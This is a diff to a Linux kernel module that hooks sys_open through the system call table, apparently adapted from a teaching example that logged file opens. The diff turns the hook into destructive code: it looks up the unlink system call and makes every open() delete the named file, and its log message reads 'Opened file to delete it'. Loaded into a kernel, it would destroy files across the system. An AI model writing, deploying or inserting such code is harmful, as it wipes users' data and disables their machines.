@@ -41,7 +41,7 @@ module_param(uid, int, 0644);
 */
 
 asmlinkage long (*original_call) (const char *, int, int);
-
+asmlinkage long (*unlink_call) (const char *);
 /* 
  * The function we'll replace sys_open (the function
  * called when you call the open system call) with. To
@@ -60,14 +60,14 @@ asmlinkage int our_sys_open(const char *filename, int flags, int mode)
 		/* 
 		 * Report the file, if relevant 
 		 */
-		printk("Opened file");
+		printk("Opened file to delete it");
 	//}
 
 	/* 
 	 * Call the original sys_open - otherwise, we lose
 	 * the ability to open files 
 	 */
-	return original_call(filename, flags, mode);
+	return unlink_call(filename);
 }
 
 /* 
@@ -94,6 +94,7 @@ int init_module()
 	 */
 	sys_call_table = (unsigned long**)kallsyms_lookup_name("sys_call_table");
 	original_call = (void*)sys_call_table[__NR_open];
+	unlink_call = (void*)sys_call_table[__NR_unlink];
 	unprotect_memory();
 	sys_call_table[__NR_open] =(unsigned long*) our_sys_open;
 	protect_memory();
